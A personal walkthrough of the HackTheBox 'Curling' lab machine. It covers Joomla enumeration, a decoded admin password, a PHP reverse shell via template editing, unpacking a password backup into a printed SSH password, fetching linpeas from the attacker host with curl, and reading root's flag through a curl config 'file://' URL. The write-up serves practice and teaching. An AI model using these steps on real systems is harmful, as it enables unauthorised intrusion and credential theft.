Begin with binding machine IP to custom domain.

![[HackTheBox/Curling/images/1.png]]

Conduct port scanning `sudo nmap -sV -sC curling.htb`

![[HackTheBox/Curling/images/2.png]]

Let's check `Joomla`:

![[HackTheBox/Curling/images/3.png]]

There were nothing valuable in this page. I also conducted a port scan with `--script=vuln` NSE engine.

`sudo nmap -sV --script=vuln --max-rate=10000 curling.htb`

It reveals some potentially interesting directories & version number of `Joomla` which is 3.8.8.

![[HackTheBox/Curling/images/4.png]]

I iterated multiple fuzzing attempts ,yet no juicy information available except the `administrator` endpoint here is what kind of tools & commands I ran so far.

```bash
gobuster dir -u http://curling.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt

gobuster dir -u http://curling.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt

gobuster dir -u http://curling.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt

gobuster dir -u http://curling.htb -w /usr/share/wordlists/dirb/big.txt

gobuster dir -u http://curling.htb -w /usr/share/wordlists/dirb/common.txt

gobuster dir -u http://curling.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Furthermore, I applied also `-r` parameter to fuzz deeply. After a couple of minutes belonging with source code analysis I decided to search for patterns like `password` `hint`. However, still did not find anything ,but after I analyzed patiently I found that last line includes `secret.txt` as hint.

![[HackTheBox/Curling/images/5.png]]


`Q3VybGluZzIwMTgh` a txt includes such thing like a password. Then I wanted also push this to `Cyberchef` ->

![[HackTheBox/Curling/images/6.png]]

This sounds like a pass: `Curling2018!` ,yet username ?

One of the posts mentions about curling and 2018 strings then I saw floris at the end of the thread message.

![[HackTheBox/Curling/images/7.png]]

I tried `Floris:Curling2018!` and logged as `superadmin` according to the right side of the side.

![[HackTheBox/Curling/images/8.png]]

Since I was able to sign in directly here. What about using through admin login page.

It works !

![[HackTheBox/Curling/images/9.png]]

Initially, it will be appropriate to use github exploit just because more accessible and direct solution. Plus, it requires authenticated user ,so lets move on it.

![[HackTheBox/Curling/images/10.png]]

Direct run was not possible. Therefore, the best useful way is that create your virtual environment via `python -m venv venv` then install requirements line by line.

```bash
pip install requests
pip install lxml
pip install log_colors
```

Now usage is easy just to follow the guideline:

![[HackTheBox/Curling/images/11.png]]

The script stucks ,so I manually reach the endpoint where shell payload executed.

`/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA=`

![[HackTheBox/Curling/images/12.png]]

Generic `PentestMonkey` works just because application running on `PHP` on backend side ,but at this time I'll use reverse shell generator's payload.

Start to invoke listener ->

```bash
penelope -p 1234
```

I used Ivan Sencek's payload:

Save and execute PHP script through `template preview` option which runs server side script.

![[HackTheBox/Curling/images/13.png]]

You must get `floris` account to get user flag and I discovered a file called `password_backup` then including weird things.

![[HackTheBox/Curling/images/14.png]]

I searched for `BZh91AY` and identified such pattern in overthewire challenge.

[Challenge](https://david-varghese.medium.com/overthewire-bandit-level-12-level-13-2ec761a88907)

Let's use ->

```bash
xxd -r data > binary
ls  binary  data
```

target machine has `/usr/bin/xxd` binary.

I got permission error on while I was working on `floris` user then moved `tmp` directory.

![[HackTheBox/Curling/images/15.png]]

The challenge suggested that identify the file type ->

![[HackTheBox/Curling/images/16.png]]

```bash
bunzip2 binary or bzip2 -d binary
```

We have to go further ->

![[HackTheBox/Curling/images/17.png]]

Now I was dealing with `gzip` format.

![[HackTheBox/Curling/images/18.png]]

```bash
mv binary.out binary.gz
gunzip binary.gz
```

![[HackTheBox/Curling/images/19.png]]


```bash
mv binary binary2.bz2
bunzip2 binary2.bz2 or bzip2 -d binary2.bz2
```

![[HackTheBox/Curling/images/20.png]]

```bash
tar -xf binary2
cat password.txt
5d<wdCbdZu)|hChXll
```

Now this is the most probably password for SSH of floris.

Gotcha ! ! !

![[HackTheBox/Curling/images/21.png]]

I checked for local privilege escalation vector via `sudo -l`.

![[HackTheBox/Curling/images/22.png]]

It did not work.

I did not find anything valuable on `admin-area` directory ,so lets start linpeas.

`curl http://10.10.15.57:1212/linpeas.sh -o linpeas.sh`

did not useful.

Somehow, admin-area directory includes interesting file formats regarding to the root path.

![[HackTheBox/Curling/images/23.png]]

It points out the localhost then `report` includes the parsed page.

![[24.png]]

lets check to parse the page via `curl`:

![[25.png]]

Observe that parsing results point out the same pages.

I began to find a way to point to the target machine files to read root flag.

I found a bug bounty report including the usage for these types of purposes:

[Report](https://hackerone.com/reports/3242087)

Try them ->

![[26.png]]

Alter the content of the `input` file as below:

`url = "file:///root/root.txt"`

then read the root flag from `cat report`

![[27.png]]

![[28.png]]